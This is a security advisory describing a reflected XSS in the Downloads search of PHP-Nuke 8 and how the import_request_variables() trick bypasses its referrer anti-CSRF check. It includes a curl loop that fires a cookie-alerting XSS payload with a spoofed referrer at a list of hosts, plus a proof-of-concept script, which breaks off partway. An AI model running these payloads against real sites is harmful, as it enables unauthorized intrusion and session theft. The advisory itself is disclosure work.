I. BACKGROUND

Php Nuke is a CMS written in PHP. This advisory is just an example on
how to exploit an XSS on platforms that use anti CSRF techniques with
the import_request_variables() bypass.

II. DESCRIPTION

An XSS vulnerability exists in the handling of the query post variable
in the Search function of the Downloads module. This is exploitable in
special conditions; you need:

 - PHP >=4.0.7 <=5.2.1 to use the import_request_variables() trick
 - register_globals off (doesn't work with globals on)
 - Php Nuke 8 and others

III. ANALYSIS

Php Nuke 8.0 is vulnerable to an XSS on _POST, you can verify this using
the provided testsuite.

www.phpnuke.org [67.15.16.43] 80 (http) open
<form
action="modules.php?name=Downloads&amp;d_op=search&amp;query=token<>toke

Infact the injection is in the form action:

<form
action="modules.php?name=Downloads&amp;d_op=search&amp;query=token<>token"
method="post">

When you will try to apply CSRF to this bug (eg. you need a gateway page
to send the post query) you'll notice that Php Nuke has a generic piece
of code in mainfile.php that prevents posting with a "wrong" referrer.

Test this with the following two testsuites:

In the first case the attack will succeed cause the referrer matches, in
the second the anti-off-domain-post-check will block your attempt and
you'll get a message like: Posting from another server not allowed!

It seems that other versions have this check too.

--- >8 --- >8 --- >8 --- >8 --- ------------ --- >8 --- >8 --- >8 --- >8

for i in `cat urls.txt`; do
echo $i; curl -s "http://$1/modules.php?name=Downloads&d_op=search" \
-d 'query=asd&query="token<img src="wrong"
onerror=alert(document.cookie) /><"' \
-e "www.tin.it" -H "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US;
rv:1.8.1.1) Gecko/20061208 Firefox/2.0.0.1";
done; echo

The initial part of mainfile.php can be synthesized as following:

--- >8 --- >8 --- >8 --- >8 --- ------------ --- >8 --- >8 --- >8 --- >8

// get php version
$phpver = phpversion();

// convert superglobals if php is lower then 4.1.0
if ($phpver < '4.1.0') {
 [..cut..]
}

// override old superglobals if php is higher then 4.1.0
if($phpver >= '4.1.0') {
 [..cut..]
}

if (!ini_get('register_globals')) {
 @import_request_variables("GPC", "");
}

[..]

// Posting from other servers in not allowed
if ($_SERVER['REQUEST_METHOD'] == "POST") {
 if (isset($_SERVER['HTTP_REFERER'])) {
  if (!stripos_clone($_SERVER['HTTP_REFERER'], $_SERVER['HTTP_HOST']))
   die('Posting from another server not allowed!');
 } else die($posttags);
}

--- >8 --- >8 --- >8 --- >8 --- ------------ --- >8 --- >8 --- >8 --- >8

So if globals are off using the import_request_variables() trick we can
overwrite the _SERVER array and bypass the check (yes, you can do a lot
of other things too, this is just an example).

Use this code to replicate the issue:

--- >8 --- >8 --- >8 --- >8 --- poc.sh --- >8 --- >8 --- >8 --- >8

#!/bin/bash
cat > testsuite.php << TOKEN
<?php
echo 'GLOBALS '.(int)ini_get("register_globals")."\\n";
if (!ini_get('register_globals')) import_request_variables('GPC');
// Posting from other servers in not allowed
if (\$_SERVER['REQUEST_METHOD'] == "POST") {
 if (isset(\$_SERVER['HTTP_REFERER'])) {
  if (!stripos(\$_SERVER['HTTP_REFERER'], \$_SERVER['HTTP_HOST']))
   die('Posting from another server not allowed!');
 } else die('No referer!');
}

echo 'IM THE PAGE!'."\n";

?>

Doesn't this seems cyclic to you? stripos will return TRUE if the
array element doesn't exists.
